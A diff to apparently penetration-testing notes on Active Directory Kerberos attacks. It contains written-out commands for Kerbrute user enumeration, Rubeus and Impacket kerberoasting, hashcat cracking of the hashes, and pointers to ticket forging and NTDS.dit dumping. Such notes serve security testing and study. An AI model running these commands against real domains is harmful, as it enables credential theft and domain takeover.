@@ -7,7 +7,7 @@
 ### Enumerating Users using [Kerbrute](https://github.com/ropnop/kerbrute/releases)
 
 ```bash
-./kerbrute -dc <DOMAIN-CONTROLLER> -d <FULL-DOMAIN> USER-WORDLIST.txt -t 50
+./kerbrute -dc DC_IP -d DOMAIN USER.txt -t 50
 ```
 
 ### Harvesting TGTs using [Rubeus](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)
@@ -31,11 +31,10 @@ crack service password.
 ```bash
 # using Rubeus.exe
 Rubeus.exe kerberoast
-# copy hash and crack using hashcat -m 13100
 
-# using Impacket
 # dump the Kerberos hash for all kerberoastable accounts
-python3 GetUserSPNs.py DOMAIN/USER:PASS> -dc-ip <DOMAIN-CONTROLLER> -request
+impacket-GetUserSPNs DOMAIN/USER:'PASS' -dc-ip DC_IP -request
+hashcat -m 13100
 ```
 
 * If the service account is domain admin > Golden/Silver ticket > dumping the NTDS.dit.
